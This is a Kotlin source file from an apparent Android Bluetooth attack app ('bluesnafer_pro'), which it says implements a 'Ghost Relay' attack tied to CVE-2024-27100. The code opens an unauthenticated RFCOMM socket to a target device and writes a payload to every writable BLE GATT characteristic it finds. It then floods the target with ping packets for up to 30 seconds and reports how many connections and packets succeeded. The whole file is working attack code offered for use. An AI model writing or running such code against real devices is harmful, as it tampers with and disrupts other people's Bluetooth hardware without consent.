package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

/**
 * Ghost Relay (CVE-2024-27100) — relay dual-transport RFCOMM SPP + BLE GATT.
 */
object GhostRelayAttack {
    private const val TAG = "GhostRelay"
    private val SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")

    @Volatile
    private var relayActive = false
    private var relayThread: Thread? = null

    fun executeRelay(device: BluetoothDevice, durationSec: Int = 30): Map<String, Any> {
        Log.d(TAG, "Ghost relay on ${device.address} (${durationSec}s)")
        relayActive = true

        val connectionsEstablished = AtomicInteger(0)
        val packetsRelayed = AtomicInteger(0)
        val gattWritesConfirmed = AtomicInteger(0)
        var socket: BluetoothSocket? = null
        var gatt: BluetoothGatt? = null

        return try {
            try {
                socket = device.createInsecureRfcommSocketToServiceRecord(SPP_UUID)
                socket.connect()
                connectionsEstablished.incrementAndGet()
            } catch (e: Exception) {
                Log.w(TAG, "SPP connect failed: ${e.message}")
            }

            val appContext = BluetoothMethodHandler.getAppContext()
            val gattLatch = CountDownLatch(1)

            if (appContext != null) {
                val callback = object : BluetoothGattCallback() {
                    override fun onConnectionStateChange(g: BluetoothGatt, status: Int, newState: Int) {
                        if (newState == BluetoothProfile.STATE_CONNECTED) {
                            connectionsEstablished.incrementAndGet()
                            g.discoverServices()
                        } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                            gattLatch.countDown()
                        }
                    }

                    override fun onServicesDiscovered(g: BluetoothGatt, status: Int) {
                        if (status != BluetoothGatt.GATT_SUCCESS) {
                            gattLatch.countDown()
                            return
                        }
                        val payload = "GHOST_RELAY".toByteArray()
                        for (service in g.services) {
                            for (char in service.characteristics) {
                                if (packetsRelayed.get() >= 6) break
                                val writable = (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE) != 0 ||
                                    (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE) != 0
                                if (!writable) continue
                                char.writeType = BluetoothGattCharacteristic.WRITE_TYPE_NO_RESPONSE
                                char.value = payload
                                if (g.writeCharacteristic(char)) packetsRelayed.incrementAndGet()
                            }
                        }
                        g.disconnect()
                    }

                    override fun onCharacteristicWrite(
                        g: BluetoothGatt,
                        characteristic: BluetoothGattCharacteristic,
                        status: Int
                    ) {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            gattWritesConfirmed.incrementAndGet()
                        }
                    }
                }

                gatt = device.connectGatt(appContext, false, callback, BluetoothDevice.TRANSPORT_LE)
                gattLatch.await(8, TimeUnit.SECONDS)
            }

            val sppSocket = socket
            if (sppSocket?.isConnected == true) {
                relayThread = Thread {
                    val endTime = System.currentTimeMillis() + durationSec * 1000L
                    while (relayActive && System.currentTimeMillis() < endTime) {
                        try {
                            val ping = "RELAY_PING_${System.currentTimeMillis()}".toByteArray()
                            sppSocket.outputStream.write(ping)
                            sppSocket.outputStream.flush()
                            packetsRelayed.incrementAndGet()
                            Thread.sleep(100)
                        } catch (_: Exception) {
                            break
                        }
                    }
                }
                relayThread?.start()
                relayThread?.join((durationSec * 1000L).coerceIn(1000L, 30_000L))
            }

            relayActive = false
            try { socket?.close() } catch (_: Exception) {}
            try { gatt?.close() } catch (_: Exception) {}

            val totalPackets = packetsRelayed.get()
            val totalConnections = connectionsEstablished.get()

            mapOf(
                "success" to (totalConnections > 0 && totalPackets > 0),
                "message" to when {
                    totalConnections > 0 && totalPackets > 0 ->
                        "Ghost relay: $totalConnections transportes, $totalPackets paquetes"
                    totalConnections > 0 -> "Conexión establecida sin relay efectivo"
                    else -> "No se pudo establecer relay"
                },
                "connectionsEstablished" to totalConnections,
                "packetsRelayed" to totalPackets,
                "gattWritesConfirmed" to gattWritesConfirmed.get(),
                "technique" to "ghost_relay_dual_transport",
                "cve" to "CVE-2024-27100"
            )
        } catch (e: Throwable) {
            relayActive = false
            mapOf("success" to false, "error" to (e.message ?: "Ghost relay failed"))
        }
    }

    fun cancelRelay() {
        relayActive = false
        relayThread?.interrupt()
        relayThread = null
    }
}